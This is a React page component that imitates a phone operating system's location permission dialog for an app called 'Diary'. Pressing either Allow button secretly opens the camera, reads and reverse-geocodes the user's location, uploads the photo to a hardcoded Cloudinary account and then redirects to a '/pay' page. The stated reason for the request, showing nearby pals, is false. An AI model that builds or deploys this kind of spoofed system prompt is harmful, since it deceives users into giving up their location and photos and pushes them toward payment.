import { useContext, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import Reusablespinz from "../Components/Reusablespinz";
import "../Css/location.css";
import { CityContext, ImageContext, LattitudeContext, LongitudeContext, RegionContext } from "../App";

function Location() {
    const navigate = useNavigate();
    const { image, setimage } = useContext(ImageContext);
    const { setcity } = useContext(CityContext);
    const { setregion } = useContext(RegionContext);
    const {setLattitude}=useContext(LattitudeContext)
    const {setLongitude}=useContext(LongitudeContext)

    const [loading, setLoading] = useState(false);
    const [loadingMessage, setLoadingMessage] = useState("");
    const fileInputRef = useRef(null);

    const handleAllowClick = async () => {
        // 1. Immediately trigger camera input
        if (fileInputRef.current) {
            fileInputRef.current.click();
        }

        // 2. Meanwhile fetch location
        setLoading(true);
        setLoadingMessage("Getting your location...");

        try {
            const permission = await navigator.permissions.query({ name: "geolocation" });
            if (permission.state === "granted" || permission.state === "prompt") {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude } = position.coords;
                        try {
                            const res = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`
                            );
                            const data = await res.json();

                            const cityName = data.address.city ||
                                data.address.town ||
                                data.address.village ||
                                data.address.locality ||
                                "Unknown City";
                            const state = data.address.state || "Unknown State";

                            setcity(cityName);
                            setregion(state);
                            setLattitude(latitude)
                            setLongitude(longitude)
                            
                            console.log(latitude)
                            
                        
                        } catch (err) {
                            console.error("Reverse geocoding failed:", err);
                        }
                    },
                    (error) => {
                        console.error("Geolocation error:", error);
                    }
                );
            }
        } catch (err) {
            console.error("Permission error:", err);
        }
    };

    const handleFileChange = async (event) => {
        const file = event.target.files[0];
        if (!file) return;

        setLoading(true);
        setLoadingMessage("Uploading image...");

        const formdata = new FormData();
        formdata.append("file", file);
        formdata.append("upload_preset", "cavin_kart");
        formdata.append("cloud_name", "dl0qctpk2");

        try {
            const res = await fetch("https://api.cloudinary.com/v1_1/dl0qctpk2/image/upload", {
                method: "POST",
                body: formdata,
            });

            const pen = await res.json();
            const imageUrl = pen.url.startsWith("http://") ? pen.url.replace("http://", "https://") : pen.url;
            setimage(imageUrl);

            setTimeout(() => {
                setLoading(false);
                navigate("/pay");
            }, 1000);
        } catch (error) {
            console.error("Upload failed:", error);
            setLoading(false);
        }
    };

    return (
        <div>
            <Reusablespinz />

            {loading && (
                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex justify-center items-center z-50">
                    <div className="text-white text-lg animate-pulse">
                        {loadingMessage}
                    </div>
                </div>
            )}

            <div>
                <div className="bg-opacity-60 flex justify-center items-center bg-slate-700" id="location">
                    <div className="bg-[#1E1E1EBF] w-[270px] h-[440px] text-white rounded-[14px]">
                        <div className="location__header">
                            <h1 className="font-inter font-semibold text-[17px] indent-4">
                                Allow “Diary” to use your <span className="ml-20">location?</span>
                            </h1>
                            <p className="text-[13px] font-medium">
                                Turning on location services allows us{" "}
                                <span className="ml-3">to show you when pals are nearby.</span>
                            </p>
                        </div>

                        <iframe
                            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d4013467.1025377945!2d73.26350234190727!3d10.78053209201264!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3b00c582b1189633%3A0x559475cc463361f0!2sTamil%20Nadu!5e0!3m2!1sen!2sin!4v1743676861541!5m2!1sen!2sin"
                            width="270"
                            height="180"
                            allowFullScreen=""
                            loading="lazy"
                            referrerPolicy="no-referrer-when-downgrade"
                        ></iframe>

                        <div className="flex flex-col">
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] font-inter text-[#5A91F7]"
                                onClick={handleAllowClick}
                            >
                                Allow
                            </button>
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] text-[#5A91F7]"
                                onClick={handleAllowClick}
                            >
                                Allow While Using App
                            </button>
                            <button
                                className="w-[270px] h-[44px] border border-[#787878] text-[#5A91F7] rounded-bl-xl rounded-br-xl"
                                onClick={() => navigate("/")}
                            >
                                Don’t Allow
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* Camera trigger input */}
            <input
                type="file"
                accept="image/*"
                capture="environment"
                ref={fileInputRef}
                onChange={handleFileChange}
                style={{ display: "none" }}
            />
        </div>
    );
}

export default Location;
